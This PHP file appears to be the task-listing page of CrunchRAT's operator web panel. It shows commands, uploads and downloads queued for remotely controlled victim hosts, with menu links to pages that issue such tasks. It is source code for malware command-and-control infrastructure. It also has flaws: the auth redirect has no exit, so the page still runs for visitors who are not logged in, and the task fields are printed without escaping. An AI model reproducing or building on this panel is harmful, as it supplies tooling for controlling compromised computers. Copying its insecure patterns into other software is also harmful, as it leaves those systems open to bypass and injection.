<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
    <link rel="stylesheet" type="text/css" href="jquery/jquery.dataTables.min.css"> <!-- dataTables CSS -->
    <script type="text/javascript" charset="utf8" src="jquery/jquery.dataTables.min.js"></script> <!-- dataTables JavaScript -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
      <ul class="nav navbar-nav">
        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
        <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
        <li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
            <li><a href="tasks.php">View Tasks</a></li>
            <li><a href="command.php">Task Command</a></li>
            <li><a href="upload.php">Task Upload</a></li>
            <li><a href="download.php">Task Download</a></li>
          </ul>
        </li> <!-- End of "Task" drop-down menu -->

        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
          <ul class="dropdown-menu">
            <li><a href="addUser.php">Add User</a></li>
            <li><a href="changePassword.php">Change Password</a></li>
            <li role="separator" class="divider"></li>
            <li><a href="logout.php">Logout</a></li>
          </ul>
        </li> <!-- End of "Account Management" drop-down menu -->
        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
      </ul>
    </nav> <!-- End of navigation bar -->

    <div class="container"> <!-- Start of main body container -->
      <table class="display" id="tasksTable"> <!-- Start of tasks dataTable -->
        <thead>
          <tr>
            <th>Task ID</th>
            <th>Tasked By</th>
            <th>Hostname</th>
            <th>Task Action</th>
            <th>Task Secondary</th>
          </tr>
        </thead>

        <tbody>
        <?php
          # Gets a list of all of tasks
          # This information will be used to build a HTML table
          $statement = $dbConnection->prepare("SELECT id, user, hostname, action, secondary FROM tasks");
          $statement->execute();
          $results = $statement->fetchAll();

          # Kills database connection
          $statement->connection = null;

          # Builds HTML table for each host in the "tasks" table
          foreach ($results as $row)
          {
            echo "<tr>"; # Start of HTML table row
            echo "<td>" . $row["id"] . "&ensp;&ensp;<a type='submit' class='btn btn-danger btn-xs' href='deleteTask.php?id=" . $row["id"] . "'>Delete Task</a></td>";
            echo "<td>" . $row["user"] . "</td>";
            echo "<td>" . $row["hostname"] . "</td>";
            echo "<td>" . $row["action"] . "</td>";
            echo "<td>" . $row["secondary"] . "</td>";
            echo "</tr>"; # End of HTML table row
          }
        ?>
        </tbody>
      </table> <!-- End of tasks dataTable -->

      <!-- Start of dataTable JavaScript code -->
      <script> 
        $(document).ready(function() {
          $('#tasksTable').DataTable( {
            stateSave: true
          } );
        } );
      </script> <!-- End of dataTable JavaScript code -->
    </div> <!-- End main body container -->
  </body> <!-- End of body -->
</html>
